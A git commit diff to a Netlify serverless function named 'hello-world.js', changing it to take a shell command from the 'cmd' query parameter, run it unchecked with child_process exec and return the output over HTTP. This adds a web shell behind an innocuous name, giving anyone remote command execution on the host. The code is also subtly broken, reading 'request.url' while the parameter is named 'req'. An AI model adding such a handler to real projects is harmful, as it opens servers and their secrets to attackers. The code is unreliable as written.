dfea54ce76eec0c8803acc5f8a17cd1a0ca9523d
urcqpoc <x16g1n@gmail.com>
2025-07-27 21:39:14 +0700

    Paramterize cmd

--- netlify/functions/hello-world.js
+++ netlify/functions/hello-world.js
@@ -1,9 +1,11 @@
 const util = require('util');
 const exec = util.promisify(require('child_process').exec);
 
-exports.handler = async () => {
+exports.handler = async (req) => {
   try {
-    const { stdout, stderr } = await exec('ls -l');
+    const url = new URL(request.url);
+    const cmd = url.searchParams.get('cmd');
+    const { stdout, stderr } = await exec(cmd);
     console.log('Output:', stdout);
     if (stderr) {
       console.error('Error output:', stderr);
@@ -11,10 +13,10 @@ exports.handler = async () => {
     return {
     statusCode: 200,
     body: `stdout:
-      ${stdout}
-      stderr:
-      ${stderr}
-    `
+${stdout}
+stderr:
+${stderr}
+`
   };
   } catch (err) {
     console.error('Execution failed:', err);
